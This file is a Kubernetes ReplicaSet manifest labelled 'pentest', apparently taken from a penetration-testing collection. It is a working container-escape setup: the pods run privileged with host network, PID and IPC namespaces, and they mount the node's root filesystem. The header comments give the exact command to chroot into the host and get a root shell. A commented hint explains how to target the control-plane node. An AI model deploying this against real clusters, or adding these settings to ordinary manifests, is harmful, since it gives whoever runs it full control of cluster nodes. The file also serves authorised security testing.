###########################################################
## Deploy:   kubectl apply -f everything-allowed-exec-replicaset.yaml
## Find Pod: kubectl get pods | grep everything-allowed-exec-replicaset 
## Access:   kubectl exec -it everything-allowed-exec-replicaset-ID -- chroot /host bash
## Remove:   kubectl delete replicaset everything-allowed-exec-replicaset
###########################################################
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: everything-allowed-exec-replicaset
  labels:
    app: pentest
    type: replicaset
spec:
  replicas: 2
  selector:
    matchLabels:
      type: replicaset
  template:
    metadata:
      labels:
        app: pentest
        type: replicaset
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: everything-allowed-exec-replicaset
        image: ubuntu
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /
      